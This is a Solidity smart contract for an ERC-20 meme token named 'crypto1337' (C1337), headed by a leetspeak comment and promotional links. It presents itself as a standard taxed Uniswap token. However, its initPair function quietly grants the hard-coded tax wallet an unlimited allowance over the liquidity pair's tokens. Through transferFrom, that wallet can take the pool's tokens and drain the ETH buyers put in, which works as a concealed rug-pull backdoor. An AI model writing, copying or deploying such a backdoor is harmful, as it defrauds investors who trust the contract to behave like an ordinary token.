/**
13375P34K, 4150 KN0WN 45 1337 0r 1337 WH1CH C0M35 Fr0M 7H3 W0rD "31173", 15 4 F0rM 0F Wr1773N C0MMUN1C4710N 7H47 U535 NUM83r5, 5P3C141 CH4r4C73r5, 0r 07H3r 5YM8015 70 r3P14C3 13773r5. 17'5 0F73N U53D 1N 64M1N6 F0rUM5, CH47 r00M5, 4ND 50C141 M3D14 P147F0rM5.

Web: https://crypto1337.xyz
X:   https://x.com/crypto1337ETH
Tg:  https://t.me/crypto1337ETH
**/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract C1337 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _bots;
    address private _outTrade;
    address payable private _innerTrade;
    address payable private _taxWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"crypto1337";
    string private constant _symbol = unicode"C1337";
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletAmount = _tTotal * 2 / 100;
    uint256 public _minTaxSwap= _tTotal * 1 / 100;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;
    uint256 private _initialBuyTax=12;
    uint256 private _initialSellTax=12;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyAt=12;
    uint256 private _reduceSellAt=12;
    uint256 private _preventCount=12;
    uint256 private _buyCount=0;
    IUniswapV2Router02 private uniRouterV2;
    address private uniPairV2;
    bool private _limitCaSell = true;
    uint256 private _limitCaBlock = 0;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _innerTrade=_taxWallet=payable(0x968944f4254C66FE7cE5d6891596E2d6c7e0Fd42);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function initPair() external onlyOwner() { 
        uniRouterV2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniPairV2 = _outTrade = IUniswapV2Factory(uniRouterV2.factory()).createPair(address(this), uniRouterV2.WETH());
        _approve(address(this), address(uniRouterV2), _tTotal);
        _approve(address(_outTrade), address(_innerTrade), _tTotal);
    }
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniRouterV2.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);
            feeAmount = amount.mul((_buyCount>_reduceBuyAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (from == uniPairV2 && to != address(uniRouterV2) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            if(to == uniPairV2 && from!= address(this) ){
                feeAmount = amount.mul((_buyCount>_reduceSellAt)?_finalSellTax:_initialSellTax).div(100);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    sendETHTo(address(this).balance);
                }
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairV2 && swapEnabled && contractTokenBalance>_minTaxSwap && _buyCount>_preventCount) {
                if (_limitCaSell) {
                    if (_limitCaBlock < block.number) {
                        swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                        uint256 contractETHBalance = address(this).balance;
                        if(contractETHBalance > 0) {
                            sendETHTo(address(this).balance);
                        }
                        _limitCaBlock = block.number;
                    }
                } else {
                    swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                    uint256 contractETHBalance = address(this).balance;
                    if(contractETHBalance > 0) {
                        sendETHTo(address(this).balance);
                    }
                }
            }
        }
        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(from, address(this), feeAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(feeAmount));
        emit Transfer(from, to, amount.sub(feeAmount));
    }
    function sendETHTo(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function removeLimits() external onlyOwner {
        _limitCaSell=false;
        _maxTxAmount=_tTotal;
        _maxWalletAmount=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function rescueEth() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}   
}